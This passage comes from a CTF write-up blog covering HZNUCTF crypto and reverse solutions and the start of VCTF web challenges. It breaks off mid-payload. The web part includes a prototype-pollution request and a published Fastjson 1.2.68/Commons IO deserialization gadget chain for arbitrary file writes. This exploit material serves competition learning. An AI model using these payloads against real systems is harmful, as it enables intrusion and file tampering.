class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;string wrong!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str2 = <span class="built_in">input</span>(<span class="string">&#x27;please input your next string:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str2) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;lenth wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        output[i] ^= <span class="built_in">ord</span>(str2[i % <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    output[i] ^= <span class="built_in">ord</span>(str1[i % <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>猜测x是key，异或后即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">34</span>, <span class="number">44</span>, <span class="number">72</span>]</span><br><span class="line">output = [<span class="number">106</span>, <span class="number">118</span>, <span class="number">6</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">28</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">23</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">61</span>, <span class="number">125</span>, <span class="number">104</span>, <span class="number">39</span>, <span class="number">125</span>, <span class="number">29</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">81</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    output[i] ^= x[i % <span class="number">3</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(output[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># HZNUCTF&#123;00!_y0u_Do_1t!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-encode"><a href="#ez-encode" class="headerlink" title="ez_encode"></a>ez_encode</h2><p>赛博厨子一把梭</p><p><img src="/./HZNUCTF/c_1_1.png"></p><h2 id="你知道什么叫第二重要极限吗？"><a href="#你知道什么叫第二重要极限吗？" class="headerlink" title="你知道什么叫第二重要极限吗？"></a>你知道什么叫第二重要极限吗？</h2><p>找个在线网站求出极限的值再md5一下即可。</p><p>网站：<a href="https://zh.numberempire.com/limitcalculator.php">极限计算器</a></p><p><img src="/./HZNUCTF/c_2_1.png"></p><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 12566670550037472299857950450003060170543220489916388216108225583064368322313899804227543199410966827815054158227594990460167944742865670575641390368325110501757177815240023094766378289637565567657130897900181098182493743124700034725694478105732966433589893047975249354370253300873663004210794844162122949861831889639652391219517545984669360480993893579226705266579746356691022559954498205977100626718703472959781277579633411710680518214072645890060091696596677005871169794651099630888477188908717174196927146741531268975111463546260970984916650217713571773967414868843498089570525035105444427219273563117921246804473</span></span><br><span class="line"><span class="string">c= 4124624756019497985716853528084082801715336009122321144611208260743394500347979730096802843910414584127892037242967052613391189149745555464301106682220336094445291743913607113208572333466692690543238555216464948419114875183086195193063296003211213015928593592167433717598516244635364208977388314062522329260854816785931896124692965607665688555874771010513517238105683326015230127982290701518048033192554799179965513164276929053041064167818711631412974446463873856951641611547970769034038478710696476593301560763875141191494692433617954869188473092441104714849891612692614501415736545219466763702237015017246607888479</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/wandervogel/p/16499814.html">NepCTF2022]中学数学</a></p><blockquote><p>next_prime算法的本质逻辑即是通过不断枚举奇数判断是否为素数，而这里n的分解保证了其必为素数，再判断素数的话属于是多此一举（浪费计算资源），所以我们可以根据素数分布公式或next_prime的方案向下枚举，得到唯一分解即可。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n= <span class="number">12566670550037472299857950450003060170543220489916388216108225583064368322313899804227543199410966827815054158227594990460167944742865670575641390368325110501757177815240023094766378289637565567657130897900181098182493743124700034725694478105732966433589893047975249354370253300873663004210794844162122949861831889639652391219517545984669360480993893579226705266579746356691022559954498205977100626718703472959781277579633411710680518214072645890060091696596677005871169794651099630888477188908717174196927146741531268975111463546260970984916650217713571773967414868843498089570525035105444427219273563117921246804473</span></span><br><span class="line">c= <span class="number">4124624756019497985716853528084082801715336009122321144611208260743394500347979730096802843910414584127892037242967052613391189149745555464301106682220336094445291743913607113208572333466692690543238555216464948419114875183086195193063296003211213015928593592167433717598516244635364208977388314062522329260854816785931896124692965607665688555874771010513517238105683326015230127982290701518048033192554799179965513164276929053041064167818711631412974446463873856951641611547970769034038478710696476593301560763875141191494692433617954869188473092441104714849891612692614501415736545219466763702237015017246607888479</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">q = next_prime(iroot((n + (n &gt;&gt; <span class="number">500</span>)), <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = <span class="built_in">int</span>(n // q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># HZNUCTF&#123;easy_rsa_challenge_isnt_it&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit = <span class="number">32</span></span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">k = getRandomNBitInteger(nbit)</span><br><span class="line">p = <span class="number">3</span>*k**<span class="number">17</span> + <span class="number">3</span>*k**<span class="number">11</span> - <span class="number">53</span>*k**<span class="number">7</span> + <span class="number">12</span>*k**<span class="number">5</span> - <span class="number">114</span>*k + <span class="number">27329</span></span><br><span class="line">q = <span class="number">5</span>*k**<span class="number">13</span> - <span class="number">7</span>*k**<span class="number">11</span> + <span class="number">43</span>*k**<span class="number">5</span> - <span class="number">313</span>*k**<span class="number">3</span> - <span class="number">14</span>*k + <span class="number">18869</span></span><br><span class="line"><span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line"><span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, n, e = <span class="number">65537</span></span>):</span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">p, q = keygen()</span><br><span class="line">n = p * q</span><br><span class="line">enc = encrypt(flag, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 434629751883495095590322184835294241713826996124724888574456689006002393371526151665914856648441777998913711962123653338248552669457411846853237739783050598017579775719691937934872919106352040902327116926790105784755926058764338785933556161606842096674927069945482244958540971324781</span></span><br><span class="line"><span class="string">enc = 12698694495692349269363576153078519111247359455557853801301945966110661300060428247980981025832474449284566651636612071026974332393320580585633615246812233266102584146373264369967669578537174446367567610553220268243715074041129093898065352593985427607547972686055285353476015645157</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里面就只有k是未知数，解方程求出k即可得到p和q。</p><p>求k</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">434629751883495095590322184835294241713826996124724888574456689006002393371526151665914856648441777998913711962123653338248552669457411846853237739783050598017579775719691937934872919106352040902327116926790105784755926058764338785933556161606842096674927069945482244958540971324781</span></span><br><span class="line"></span><br><span class="line">k = var(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solve((<span class="number">3</span>*k**<span class="number">17</span> + <span class="number">3</span>*k**<span class="number">11</span> - <span class="number">53</span>*k**<span class="number">7</span> + <span class="number">12</span>*k**<span class="number">5</span> - <span class="number">114</span>*k + <span class="number">27329</span>)*(<span class="number">5</span>*k**<span class="number">13</span> - <span class="number">7</span>*k**<span class="number">11</span> + <span class="number">43</span>*k**<span class="number">5</span> - <span class="number">313</span>*k**<span class="number">3</span> - <span class="number">14</span>*k + <span class="number">18869</span>) - n, k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># k == 2232206010</span></span><br></pre></td></tr></table></figure><p>常规rsa</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">k = <span class="number">2232206010</span></span><br><span class="line">p = <span class="number">3</span>*k**<span class="number">17</span> + <span class="number">3</span>*k**<span class="number">11</span> - <span class="number">53</span>*k**<span class="number">7</span> + <span class="number">12</span>*k**<span class="number">5</span> - <span class="number">114</span>*k + <span class="number">27329</span></span><br><span class="line">q = <span class="number">5</span>*k**<span class="number">13</span> - <span class="number">7</span>*k**<span class="number">11</span> + <span class="number">43</span>*k**<span class="number">5</span> - <span class="number">313</span>*k**<span class="number">3</span> - <span class="number">14</span>*k + <span class="number">18869</span></span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c= <span class="number">12698694495692349269363576153078519111247359455557853801301945966110661300060428247980981025832474449284566651636612071026974332393320580585633615246812233266102584146373264369967669578537174446367567610553220268243715074041129093898065352593985427607547972686055285353476015645157</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># HZNUCTF&#123;cdf7d315-4f57-4d3b-b7b9-8afdbcfccda9&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ez-hash"><a href="#ez-hash" class="headerlink" title="ez_hash"></a>ez_hash</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(sin(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(), <span class="string">&quot;big&quot;</span>)).n(<span class="number">1024</span>))</span><br><span class="line"><span class="comment">#0.9293072566360917156721319625113859414638614581752638175081621377181647077177905614201525663698026484356904149524948758114053950932573856913592620188629564842619113660708249485771619087909572007797061060693639948035909320176601470572889582595546521165948926724721219315095929084715884686268383018745103696402</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://tangcuxiaojikuai.xyz/post/3f46adc9.html">2023-ASISCTF-finals-wp-crypto</a></p><p>参考里是 tan，但原理都一样。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">precision = <span class="number">1024</span></span><br><span class="line">s = <span class="number">0.9293072566360917156721319625113859414638614581752638175081621377181647077177905614201525663698026484356904149524948758114053950932573856913592620188629564842619113660708249485771619087909572007797061060693639948035909320176601470572889582595546521165948926724721219315095929084715884686268383018745103696402</span></span><br><span class="line">approx_m = arcsin(s)</span><br><span class="line">T = <span class="number">2</span>**(precision)</span><br><span class="line">L = Matrix(QQ,<span class="number">3</span>,<span class="number">3</span>,[[(approx_m)*T,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                [(pi.n(precision))*T,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">                [<span class="number">9</span>*T,<span class="number">0</span>,<span class="number">1</span>]])</span><br><span class="line">res = L.LLL()</span><br><span class="line">m = (<span class="built_in">abs</span>(<span class="built_in">int</span>(res[<span class="number">0</span>][-<span class="number">1</span>])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;HZNUCTF&#123;sin_is_a_broken_hash_function&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> REVERSE </tag>
            
            <tag> HZNUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VCTF WP</title>
      <link href="/VCTF/"/>
      <url>/VCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="hackjs"><a href="#hackjs" class="headerlink" title="hackjs"></a>hackjs</h2><p>源码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;</span><br><span class="line">    <span class="attr">extended</span>: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/plz&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    venom = req.<span class="property">body</span>.<span class="property">venom</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(venom);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(venom).<span class="property">length</span> &lt; <span class="number">3</span> &amp;&amp; venom.<span class="property">welcome</span> == <span class="number">159753</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(venom.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;text&quot;</span>))&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(venom.<span class="property">text</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;no text detected&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (venom.<span class="property">text</span>==<span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> flag=fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;Congratulations:&quot;</span>+flag);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&quot;Nothing here!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;happy game&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"><span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;title&gt;oldjs&lt;/title&gt;&lt;a&gt;Hack me plz&lt;/a&gt;&lt;br&gt;&lt;form action=&quot;/plz&quot; method=&quot;POST&quot;&gt;text:&lt;input type=&quot;text&quot; name=&quot;venom[text]&quot; value=&quot;ezjs&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Hack&quot;&gt;&lt;/form&gt;  &#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening at port 80`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p>让<code>venom.hasOwnProperty(&quot;text&quot;)</code>报错，利用原型链污染让 <code>Object.keys(venom).length&lt;3</code> 但 <code>venom.welcome == 159753</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">venom[__proto__][welcome]=159753&amp;venom[text]=flag&amp;venom[hasOwnProperty]=123</span><br></pre></td></tr></table></figure><p><img src="/./VCTF/w_1_1.png"></p><h2 id="Archived-elephant"><a href="#Archived-elephant" class="headerlink" title="Archived elephant"></a>Archived elephant</h2><p>查看<code>pom.xml</code>，发现 <code>fastjson-1.2.66</code>。</p><p>接着找能触发<code>fastjson</code>反序列化的地方。</p><p><img src="/./VCTF/w_2_1.png"></p><p>结合回显，发现这里是在文件上传成功时会出现<code>SUCCESS</code>字样，并返回有文件名。</p><p>这里猜测文件名可控于是测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;123&quot;,&quot;c&quot;:&quot;123.jpg&quot;</span><br></pre></td></tr></table></figure><p><img src="/./VCTF/w_2_4.png"></p><p>很显然是可控的，那么我们可以通过文件名控制<code>fastjson</code>反序列化。</p><h3 id="commons-io-2-7-写文件"><a href="#commons-io-2-7-写文件" class="headerlink" title="commons-io 2.7 写文件"></a>commons-io 2.7 写文件</h3><p>在<code>pom.xml</code>里有一个<code>commons-io 2.7</code>的依赖，可以搭配<code>fastjson 1.6.38</code>来实现任意文件写。</p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/376759650">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p><p>链接的poc：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span><span class="number">2147483647</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span 